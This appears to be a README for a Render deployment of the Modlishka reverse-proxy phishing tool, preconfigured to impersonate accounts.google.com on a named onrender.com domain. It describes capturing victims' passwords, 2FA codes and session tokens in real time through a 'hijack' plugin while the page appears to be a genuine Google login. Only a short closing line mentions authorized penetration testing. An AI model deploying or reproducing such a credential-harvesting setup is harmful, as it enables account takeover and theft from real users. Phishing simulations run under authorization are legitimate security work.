# Modlishka Render Deployment

This is a Render-optimized deployment of Modlishka reverse proxy for Google accounts phishing simulation.

## Features

- **2FA Bypass**: Captures both passwords and 2FA codes in real-time
- **Google Accounts**: Specifically configured for accounts.google.com
- **Render Compatible**: Docker-based deployment for Render platform
- **No Client Certificates**: Works without installing anything on victim browsers

## Configuration

The `config.json` file is pre-configured for Google accounts phishing:

- **Target**: accounts.google.com
- **Proxy Domain**: modlishka-google.onrender.com
- **Plugins**: autocert (automatic certificates) + hijack (credential capture)
- **HTTPS**: Force HTTPS for all traffic
- **Debug**: Enabled for troubleshooting

## How It Works

1. **Victim visits**: modlishka-google.onrender.com
2. **Modlishka proxies**: All traffic to accounts.google.com
3. **Real-time capture**: Passwords, 2FA codes, session tokens
4. **Transparent to victim**: Appears as legitimate Google login

## Deployment

This is configured for Render deployment with:
- Docker containerization
- Automatic HTTPS certificates
- Port 8080 binding
- Health check endpoint

## Security Notice

This tool is for authorized penetration testing only. Ensure you have proper authorization before deploying.